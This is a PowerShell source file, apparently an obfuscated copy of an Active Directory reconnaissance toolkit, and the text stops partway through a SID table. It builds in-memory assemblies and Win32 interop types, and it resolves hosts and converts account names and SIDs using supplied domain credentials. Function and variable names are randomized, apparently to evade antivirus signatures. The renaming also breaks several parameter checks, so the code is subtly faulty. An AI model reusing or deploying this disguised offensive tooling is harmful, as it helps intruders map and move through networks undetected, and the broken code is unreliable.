function facilitation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $xGcamQKm99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $plJvNoDP99 = $xGcamQKm99.GetAssemblies()
    foreach ($oNkYMACa99 in $plJvNoDP99) {
        if ($oNkYMACa99.FullName -and ($oNkYMACa99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $oNkYMACa99
        }
    }
    $TgIhMVpS99 = New-Object Reflection.AssemblyName($ModuleName)
    $jnYnRnFJ99 = $xGcamQKm99
    $enPoirbU99 = $jnYnRnFJ99.DefineDynamicAssembly($TgIhMVpS99, 'Run')
    $eUPzjyeQ99 = $enPoirbU99.DefineDynamicModule($ModuleName, $False)
    return $eUPzjyeQ99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $hgjHXhDQ99,
        [Switch]
        $SetLastError
    )
    $ycQOyvWh99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $ycQOyvWh99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $ycQOyvWh99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $ycQOyvWh99['Charset'] = $Charset }
    if ($SetLastError) { $ycQOyvWh99['SetLastError'] = $SetLastError }
    if ($hgjHXhDQ99) { $ycQOyvWh99['EntryPoint'] = $hgjHXhDQ99 }
    New-Object PSObject -Property $ycQOyvWh99
}
function lummoxes
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $hgjHXhDQ99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $IMZzNlRE99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $IMZzNlRE99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $IMZzNlRE99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$IMZzNlRE99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $IMZzNlRE99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $IMZzNlRE99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $bZssbhYP99 = $IMZzNlRE99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($okJHKWvV99 in $ParameterTypes)
            {
                if ($okJHKWvV99.IsByRef)
                {
                    [void] $bZssbhYP99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $EYFlWIJe99 = [Runtime.InteropServices.DllImportAttribute]
            $rQiEDMcG99 = $EYFlWIJe99.GetField('SetLastError')
            $nJOPWSOk99 = $EYFlWIJe99.GetField('CallingConvention')
            $LlhUHckd99 = $EYFlWIJe99.GetField('CharSet')
            $tmEkyPuU99 = $EYFlWIJe99.GetField('EntryPoint')
            if ($SetLastError) { $kyeLIdgu99 = $True } else { $kyeLIdgu99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $NxQdPNgO99 = $hgjHXhDQ99 } else { $NxQdPNgO99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $vaymsMDl99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($rQiEDMcG99,
                                           $nJOPWSOk99,
                                           $LlhUHckd99,
                                           $tmEkyPuU99),
                [Object[]] @($kyeLIdgu99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $NxQdPNgO99))
            $bZssbhYP99.SetCustomAttribute($vaymsMDl99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $IMZzNlRE99
        }
        $PaNpuRij99 = @{}
        foreach ($Key in $IMZzNlRE99.Keys)
        {
            $Type = $IMZzNlRE99[$Key].CreateType()
            $PaNpuRij99[$Key] = $Type
        }
        return $PaNpuRij99
    }
}
function shredders {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gSpRFTcS99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $hxfduwjm99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($gSpRFTcS99))
    }
    $IMlISIeO99 = $Type -as [Type]
    $cMhBzNwL99 = $Module.DefineEnum($gSpRFTcS99, 'Public', $IMlISIeO99)
    if ($Bitfield)
    {
        $mAfCZcNd99 = [FlagsAttribute].GetConstructor(@())
        $ECJIiogJ99 = New-Object Reflection.Emit.CustomAttributeBuilder($mAfCZcNd99, @())
        $cMhBzNwL99.SetCustomAttribute($ECJIiogJ99)
    }
    foreach ($Key in $hxfduwjm99.Keys)
    {
        $null = $cMhBzNwL99.DefineLiteral($Key, $hxfduwjm99[$Key] -as $IMlISIeO99)
    }
    $cMhBzNwL99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $uUQwFskC99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $TlmuwuKV99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $uUQwFskC99
        Type = $Type -as [Type]
        Offset = $TlmuwuKV99
        MarshalAs = $MarshalAs
    }
}
function minty
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gSpRFTcS99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $PpXEyJch99,
        [Reflection.Emit.PackingSize]
        $gZdmmkYb99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $qgHEpoBH99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($gSpRFTcS99))
    }
    [Reflection.TypeAttributes] $TQRJoHeC99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($qgHEpoBH99)
    {
        $TQRJoHeC99 = $TQRJoHeC99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $TQRJoHeC99 = $TQRJoHeC99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $EKhzfloF99 = $Module.DefineType($gSpRFTcS99, $TQRJoHeC99, [ValueType], $gZdmmkYb99)
    $eTrCeFcl99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $oaTYSRsc99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $LvAStBvZ99 = New-Object Hashtable[]($PpXEyJch99.Count)
    foreach ($Field in $PpXEyJch99.Keys)
    {
        $Index = $PpXEyJch99[$Field]['Position']
        $LvAStBvZ99[$Index] = @{FieldName = $Field; Properties = $PpXEyJch99[$Field]}
    }
    foreach ($Field in $LvAStBvZ99)
    {
        $BWYSXgLJ99 = $Field['FieldName']
        $BQcAcRih99 = $Field['Properties']
        $TlmuwuKV99 = $BQcAcRih99['Offset']
        $Type = $BQcAcRih99['Type']
        $MarshalAs = $BQcAcRih99['MarshalAs']
        $kXMNMRLS99 = $EKhzfloF99.DefineField($BWYSXgLJ99, $Type, 'Public')
        if ($MarshalAs)
        {
            $srLlSHkX99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $vVvJUMRF99 = New-Object Reflection.Emit.CustomAttributeBuilder($eTrCeFcl99,
                    $srLlSHkX99, $oaTYSRsc99, @($Size))
            }
            else
            {
                $vVvJUMRF99 = New-Object Reflection.Emit.CustomAttributeBuilder($eTrCeFcl99, [Object[]] @($srLlSHkX99))
            }
            $kXMNMRLS99.SetCustomAttribute($vVvJUMRF99)
        }
        if ($qgHEpoBH99) { $kXMNMRLS99.SetOffset($TlmuwuKV99) }
    }
    $qzTyuztB99 = $EKhzfloF99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $UpnKnmsO99 = $qzTyuztB99.GetILGenerator()
    $UpnKnmsO99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $EKhzfloF99)
    $UpnKnmsO99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $UpnKnmsO99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $UpnKnmsO99.Emit([Reflection.Emit.OpCodes]::Ret)
    $GMRCtmXW99 = $EKhzfloF99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $EKhzfloF99,
        [Type[]] @([IntPtr]))
    $hobvgPyZ99 = $GMRCtmXW99.GetILGenerator()
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Nop)
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $EKhzfloF99)
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $EKhzfloF99)
    $hobvgPyZ99.Emit([Reflection.Emit.OpCodes]::Ret)
    $EKhzfloF99.CreateType()
}
Function preventive {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$FbnxBlkZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$uUQwFskC99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$zBrKMIDm99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$STjGbriy99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$YbugHbZZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cUIFFMRZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$GpKVoBAc99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$jZXrdKtT99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$kkHypkVp99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cYmWaVIh99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$IdKIcOCK99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$MFwIVYrt99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$tIsjKXwG99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$kpFcpiCt99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$rDgRlQdw99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$TKChPvlL99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Qigvpzxj99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$HRzDYIwa99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$tBIdqNFz99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $ctHqPLMn99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$mBmtwKgS99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $URtDicpQ99
    )
    Begin {
        $SVSeiGen99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $XdjUfTnD99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($mBmtwKgS99) {
            $TcsJGOJy99 = $URtDicpQ99.Keys | Where-Object { $XdjUfTnD99 -notcontains $_ }
            ForEach($okJHKWvV99 in $TcsJGOJy99) {
                if ($okJHKWvV99) {
                    Set-Variable -Name $okJHKWvV99 -Value $URtDicpQ99.$okJHKWvV99 -Scope 1 -Force
                }
            }
        }
        else {
            $fLLbvVWK99 = @()
            $fLLbvVWK99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($fLLbvVWK99) {
                $fLLbvVWK99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $CIraDERm99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($okJHKWvV99 in $CIraDERm99) {
                $LFljMBZy99 = Get-Variable -Name $okJHKWvV99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($okJHKWvV99, [ref]$tmp) -and $LFljMBZy99) {
                    $PSBoundParameters.$okJHKWvV99 = $LFljMBZy99
                }
            }
            if($ctHqPLMn99) {
                $trRrJiMA99 = $ctHqPLMn99
            }
            else {
                $trRrJiMA99 = $SVSeiGen99
            }
            $yJuFeRkV99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $hMbncfyJ99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $CyAZDWCq99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $uTJeVvpI99 = '^Alias$'
            $yTKEngLF99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $hMbncfyJ99 {
                    Try {
                        $yTKEngLF99.$_ = . $yJuFeRkV99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($trRrJiMA99.Keys -contains $Name) {
                $trRrJiMA99.$Name.Attributes.Add($yTKEngLF99)
            }
            else {
                $rVrscprT99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $CyAZDWCq99 {
                        Try {
                            $VLSPzuSk99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $yJuFeRkV99) -ErrorAction Stop
                            $rVrscprT99.Add($VLSPzuSk99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $uTJeVvpI99 {
                        Try {
                            $jiFAlFxP99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $yJuFeRkV99) -ErrorAction Stop
                            $rVrscprT99.Add($jiFAlFxP99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $rVrscprT99.Add($yTKEngLF99)
                $okJHKWvV99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $rVrscprT99)
                $trRrJiMA99.Add($Name, $okJHKWvV99)
            }
        }
    }
    End {
        if(!$mBmtwKgS99 -and !$ctHqPLMn99) {
            $trRrJiMA99
        }
    }
}
function hoarded {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $IjANvzFD99
    )
    BEGIN {
        $vSdJuRHv99 = @{}
    }
    PROCESS {
        ForEach ($UpTLmEbs99 in $Path) {
            if (($UpTLmEbs99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $asmrTIRX99 = (New-Object System.Uri($UpTLmEbs99)).Host
                if (-not $vSdJuRHv99[$asmrTIRX99]) {
                    decaf -cSHFXHUa99 $asmrTIRX99 -fjBNCklg99 $fjBNCklg99
                    $vSdJuRHv99[$asmrTIRX99] = $True
                }
            }
            if (Test-Path -Path $UpTLmEbs99) {
                if ($PSBoundParameters['OutputObject']) {
                    $ACqbUGZW99 = New-Object PSObject
                }
                else {
                    $ACqbUGZW99 = @{}
                }
                Switch -Regex -File $UpTLmEbs99 {
                    "^\[(.+)\]" # Section
                    {
                        $GwpdykjE99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $GwpdykjE99 = $GwpdykjE99.Replace(' ', '')
                            $WoBhSWen99 = New-Object PSObject
                            $ACqbUGZW99 | Add-Member Noteproperty $GwpdykjE99 $WoBhSWen99
                        }
                        else {
                            $ACqbUGZW99[$GwpdykjE99] = @{}
                        }
                        $wLVLktBf99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $wLVLktBf99 = $wLVLktBf99 + 1
                        $Name = 'Comment' + $wLVLktBf99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $ACqbUGZW99.$GwpdykjE99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $ACqbUGZW99[$GwpdykjE99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $YWNnOLoO99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $ACqbUGZW99.$GwpdykjE99 | Add-Member Noteproperty $Name $YWNnOLoO99
                        }
                        else {
                            $ACqbUGZW99[$GwpdykjE99][$Name] = $YWNnOLoO99
                        }
                    }
                }
                $ACqbUGZW99
            }
        }
    }
    END {
        $vSdJuRHv99.Keys | bonehead
    }
}
function Lilliput {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $axISfSto99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $ZRuxwyKg99 = ',',
        [Switch]
        $VQSjsENm99
    )
    BEGIN {
        $nGWohnIZ99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $GUFwFeqy99 = [System.IO.File]::Exists($nGWohnIZ99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $bMAhDhYe99 = [System.IO.FileMode]::Append
        }
        else {
            $bMAhDhYe99 = [System.IO.FileMode]::Create
            $GUFwFeqy99 = $False
        }
        $bZqcXZgK99 = New-Object IO.FileStream($nGWohnIZ99, $bMAhDhYe99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $qgPmjoCP99 = New-Object System.IO.StreamWriter($bZqcXZgK99)
        $qgPmjoCP99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $axISfSto99) {
            $LjxebMjd99 = ConvertTo-Csv -axISfSto99 $Entry -ZRuxwyKg99 $ZRuxwyKg99 -NoTypeInformation
            if (-not $GUFwFeqy99) {
                $LjxebMjd99 | ForEach-Object { $qgPmjoCP99.WriteLine($_) }
                $GUFwFeqy99 = $True
            }
            else {
                $LjxebMjd99[1..($LjxebMjd99.Length-1)] | ForEach-Object { $qgPmjoCP99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $qgPmjoCP99.Dispose()
        $bZqcXZgK99.Dispose()
    }
}
function loneliest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            try {
                @(([Net.Dns]::GetHostEntry($GocAGaEB99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[loneliest] Could not resolve $GocAGaEB99 to an IP Address."
            }
        }
    }
}
function theoretic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $GwxiGtHr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $LwjtubFd99 = @{}
        if ($PSBoundParameters['Domain']) { $LwjtubFd99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $LwjtubFd99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $LwjtubFd99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        ForEach ($Object in $GwxiGtHr99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = offings -feaYcbZI99 $Object -EsfqZxkA99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $CQMlcaaA99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $PYHFAZKa99 = $DN.Split(',')[0].split('=')[1]
                    $LwjtubFd99['Identity'] = $PYHFAZKa99
                    $LwjtubFd99['Domain'] = $CQMlcaaA99
                    $LwjtubFd99['Properties'] = 'objectsid'
                    trashier @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $jnYnRnFJ99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $LwjtubFd99 = @{}
                        $jnYnRnFJ99 = (indicate @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($jnYnRnFJ99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[theoretic] Error converting $jnYnRnFJ99\$Object : $_"
                }
            }
        }
    }
}
function belonging {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $mABfETVW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $EufoKtXA99 = @{}
        if ($PSBoundParameters['Domain']) { $EufoKtXA99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $EufoKtXA99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $EufoKtXA99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        ForEach ($yofMxotZ99 in $mABfETVW99) {
            $yofMxotZ99 = $yofMxotZ99.trim('*')
            try {
                Switch ($yofMxotZ99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
